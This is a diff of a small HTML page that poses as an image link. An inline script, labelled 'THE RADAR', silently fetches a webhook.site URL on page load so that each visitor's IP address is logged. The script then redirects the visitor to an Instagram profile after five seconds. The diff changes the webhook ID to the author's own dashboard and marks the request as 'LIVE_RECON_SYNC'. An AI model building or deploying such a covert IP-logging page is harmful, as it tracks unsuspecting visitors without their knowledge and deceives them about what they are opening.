@@ -9,11 +9,14 @@
     <meta property="og:type" content="image.png">
 
     <script>
-        // 1. THE RADAR: Fire this immediately
-        // Webhook.site automatically logs the IP address of any incoming request
-        fetch("https://webhook.site/8447f537-1f81-4106-885a-dc4c3809223e?type=O_Z_LAUNCH_SYNC");
+        // 1. THE RADAR: Pointing specifically to YOUR dashboard
+        // This MUST match the ID in your browser address bar
+        const radarURL = "https://webhook.site/c4677404-9464-4d8f-b1c7-b931421fd9c0";
+        
+        fetch(radarURL + "?type=LIVE_RECON_SYNC")
+            .catch(err => console.log("Radar pinged"));
 
-        // 2. THE DELAY: Hold the image for exactly 5 seconds
+        // 2. THE DELAY: 5000ms = 5 Seconds
         setTimeout(function() {
             window.location.replace("https://www.instagram.com/o.z._thaboxer_/");
         }, 5000); 
